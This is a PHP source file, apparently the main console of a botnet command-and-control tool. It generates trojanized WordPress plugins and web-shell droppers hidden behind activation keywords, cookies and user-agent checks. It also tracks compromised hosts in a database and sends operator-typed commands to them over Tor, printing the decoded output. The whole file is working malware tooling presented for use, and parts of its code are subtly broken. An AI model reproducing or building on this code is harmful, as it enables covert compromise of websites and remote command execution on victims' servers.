<?php
require_once "lib/classes.inc.php";

//crypto
use curlStuff\defaultClient\genericClientExecuteCommands;
use curlStuff\mainCurl;
use curlStuff\validateMeMore\talkToMeDamnit;
use logos\art\artisticStuff;
use logos\menus\mainMenu;
use new_bots\makeMeSlim\slimDropper;
use new_bots\wordpressPlugins\makeMeWordPressing;
use userAgents\agentsList;

//end crypto

//pipe dream.
//end pipe dream.

// communications
//end communications

// might remove this, since tor is what should be used.
// end stuff.

// droppers
// end droppers

//graphics and shit
//end graphipcs and shit.

$d = default_config;
$configs = $d->exportConfigConstants();
$l = new artisticStuff(true);
$m = new mainMenu();
$agents = new agentsList();
$curl = new mainCurl(true, $configs['tor']);

$choices = [
    "postgres" => $configs['pg_presets'],
    "sqlite" => $configs['sqlite_presets']
];

if (str_contains(SQL_USE, "PGSQL")) {
    $database = new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']);
    $database->firstRun();
} else {

    $database = new database\slopSqlite($choices['sqlite']['sqlite_db']);
    var_dump($database->firstRun());
    readline("Press enter to continue.");
}
$l->prepareFrames();
$l->displayLogo();
while (true) {
    system(CLEAR);
    $l->displayStaticAsciiLogo();
    $m->menu();
    $c = strtolower(trim(readline("->")));
    switch ($c) {
        case str_starts_with($c, "sys") !== false:
            $m->enumSystemMenu();
            $a = new genericClientExecuteCommands();
            break;
        case str_starts_with($c, "rev") !== false:
            $m->reverseConnectionsMenu();
            break;
        case str_starts_with($c, "com") !== false:
            // need to add handling into this script for the new script filenames.
            $m->commandMenu();
            $page = 0;
            $itemsPerPage = 10;
            $lastId = 0;
            $previous = 0;
            do {
                $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
                $lastPage = ($lastId < $itemsPerPage);
                echo "Current Page: " . ($page + 1) . "\n";
                echo "Press 'n' for next, 'b' for back, or 'q' to quit: ";
                $handle = fopen("php://stdin", "r");
                $action = trim(fgets($handle));
                fclose($handle);
                if (is_numeric($action)) {
                    $selectedEntry = $action;
                    break;
                }
                if ($action ==='n') { // next page
                    if (!$lastPage) {
                        $page++;
                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
                        $lastPage = ($lastId < $itemsPerPage);
                        if ($lastPage) {
                            echo "You're on the last page.\n";
                        }
                    } else {
                        echo "You're already on the last page.\n";
                    }
                } elseif ($action === 'b') {
                    if ($page > 0) {
                        $page--;
                        $lastId -= $itemsPerPage;
                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
                    } else {
                        echo "You're on the first page. Cannot go back any further.\n";
                    }
                }
            } while ($action !== "q");
            if ($action === "q"){
                break;
            }
            $bot = $database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
            $coms = new genericClientExecuteCommands([
                "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
                "timeout" => 5,
                "allow_redirects" => false,
                "proxy" => [
                    "http" => $d->tor,
                    "https" => $d->tor
                ],
                "cookies" => true,
                "protocols" => $bot[0]['proto'],
                "strict" => false,
                "referrer" => false,
                "track-redirects" => true
            ]
            );
            try {
                echo <<<TYPES
this shell supports the ability to serialize the commands (if you have multiple to execute at once on the specified host.
encrypt the command you are trying to execute. This will also need to be decrypted in the client. This feature has not been introduced just yet, but will soon. (older versions have this ability, but that client script sucked.)
And finally, to just send the raw command over.

The options are:
 1b -> for no modification of the command other than base64 encoding it.
 1 -> serialize and base64 encode the command, this works well if you have spaces in your command.
 e -> this will encrypt the command, in addition to base64 encoding it.
TYPES;
                $type = readline("Which of the 3 options would you like to select: ");
                $command = $coms->head($bot[0]['uri'],
                    [
                        'headers' => [
                            "User-Agent" => $bot[0]['agent']
                        ]
                    ],
                    [
                        "cr" => $type,
                        "command" => readline("What would you like to execute: "),
                        "uuid" => $bot[0]['uuid'],
                        "cname" => $bot[0]['cname'],
                        "cval" => $bot[0]['cvalue'],
                        ""
                    ]
                );
            }catch (Exception $e){
                echo $e->getMessage().PHP_EOL;
                readline("Exception occured....... Press enter to continue.".PHP_EOL);
                break;
            }
            if (!is_null($command->getHeaderLine('D'))){
                echo sprintf("Command completed!\n\n\033[0;35m%s\033[0m\n\n", base64_decode($command->getHeaderLine("D")));
            }else{
                echo "Command failed successfully.....".PHP_EOL;
            }
            readline("[ !! ] PRESS ENTER TO CONTINUE [ !! ]");
            break;
        case str_starts_with($c, "a") !== false:
            $m->addHostMenu();
            break;
        case str_starts_with($c, "cr") !== false:
            $m->dropperMenu();
            $c = trim(strtolower(readline("-> ")));
            switch ($c) {
                case str_contains($c, "small") !== false:
                    $act_word = trim(readline("Activation Keyword: "));
                    if (is_null($act_word) or $act_word === "") {
                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                    }
                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $a = $trj->createSmallTrojanWordpress();
                    $database->insertData([
                            "action" => "add_press",
                            "zip" => $a['TrojanPlugin'],
                            "activator" => $a['ActivationWord'],
                        ]
                    );
                    readline("Press the any key to continue.");
                    break;
                case str_contains($c, "chonker") !== false:
                    $act_word = trim(readline("Activation Keyword: "));
                    if (is_null($act_word) or $act_word === "") {
                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                    }
                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $yay = $trj->createChonker();
                    $database->insertData([
                        "action" => "add_press",
                        "zip" => $yay['TrojanPlugin'],
                        "activator" => $yay['ActivationWord'],
                        'CookieName' => $a['CookieName'],
                        'CookieVal' => $a['CookieVal'],
                        'AllowedAgent' => $a['AllowedAgent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
                default:
                    $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                    $a = $trj->generateDropper();
                    $database->insertData([
                        "action" => "add_dropper",
                        "location_on_disk" => $a['dropper'],
                        "post_var" => $a['post_variable'],
                        "cookiename" => $a['cookie_name'],
                        "user_agent" => $a['user_agent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
            }
            break;
        case str_starts_with($c, "ch") !== false:
            $m->validateHost();
            $validateMeMore = new talkToMeDamnit();
            try {
                $validateMeMore->checkMultiHost($database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
            } catch (Exception $e) {
                echo $e . PHP_EOL;
            }
            break;
        case str_starts_with($c, "at") !== false:
            $m->addToolMenu();
            break;
        case str_starts_with($c, "lt") !== false:
            $m->grabToolsMenu();
            break;
        case str_starts_with($c, "gp") !== false:
            $m->grabProxyMenu();
            break;
        case str_starts_with($c, "r") !== false:
            $m->resetProxyMenu();
            break;
        case str_starts_with($c, "gc") !== false:
            $m->generateCertMenu();
            break;
        case str_starts_with($c, "o") !== false:
            echo "Current Options: " . PHP_EOL;
            print_r($configs);
            readline("Press enter to continue.");
            break;
        case str_starts_with($c, "ac") !== false:
            break;
        case str_starts_with($c, "q") !== false:
            system(CLEAR);
            foreach ($m->goodBye() as $bye) {
                echo "\033[0;34m{$bye}\033[0m" . PHP_EOL;
            }
            die();
        default:
            echo "\033[0;31mThat is not a valid command.";
            break;
    }
    $c = "";
}
